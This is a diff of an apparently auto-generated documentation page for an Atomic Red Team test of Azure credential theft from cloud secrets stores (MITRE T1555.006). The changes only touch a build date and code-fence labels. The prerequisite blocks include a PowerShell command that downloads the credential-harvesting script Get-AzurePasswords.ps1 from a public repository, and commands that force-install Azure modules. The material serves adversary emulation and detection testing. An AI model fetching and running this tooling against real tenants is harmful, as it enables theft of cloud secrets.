@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1555.006"
 attack_technique_name: "Credentials from Password Stores: Cloud Secrets Management Stores"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.006/T1555.006.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:13"
 executor: "powershell"
 aliases:
   - "1b83cddb-eaa7-45aa-98a5-85fb0a8807ea"
@@ -69,13 +69,13 @@ The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPaylo
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
 invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
 ```
@@ -84,13 +84,13 @@ The Azure RM module must be installed.
 
 ### Prerequisite Check
 
-```text
+```powershell
 try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Install-Module -Name AzureRM -Force -allowclobber
 ```
 
@@ -98,13 +98,13 @@ The Azure module must be installed.
 
 ### Prerequisite Check
 
-```text
+```powershell
 try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 Install-Module -Name Azure -Force -allowclobber
 ```
 
